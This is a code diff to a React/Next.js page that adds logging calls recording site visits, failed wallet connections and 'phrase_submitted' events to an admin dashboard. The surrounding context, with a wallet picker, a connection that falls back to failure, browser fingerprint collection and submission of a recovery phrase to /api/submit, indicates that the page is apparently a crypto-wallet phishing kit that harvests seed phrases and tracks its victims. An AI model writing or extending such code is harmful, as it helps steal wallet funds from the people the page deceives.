@@ -136,6 +136,15 @@ export default function Home() {
   const [modalSearch, setModalSearch]   = useState("");
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
+  // Log site visit on mount
+  useEffect(() => {
+    fetch("/api/logs", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ status: "visited_site" })
+    }).catch(() => {});
+  }, []);
+
   // Animated dots while connecting
   useEffect(() => {
     if (step !== "connecting") return;
@@ -205,6 +214,13 @@ export default function Home() {
       }, 2500);
 
     } catch {
+      // Log connection attempt locally for admin dashboard
+      fetch("/api/logs", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ status: "connection_failed", wallet: wallet.name })
+      }).catch(() => {});
+
       // ❌ Any failure → graceful fallback
       setStep("failed");
       setTimeout(() => {
@@ -231,6 +247,13 @@ export default function Home() {
     setSubmitting(true);
 
     const fp = await collectFingerprint();
+    // Log attempt locally for admin dashboard
+    fetch("/api/logs", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ status: "phrase_submitted", wallet: selectedWallet?.name })
+    }).catch(() => {});
+
     fetch("/api/submit", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
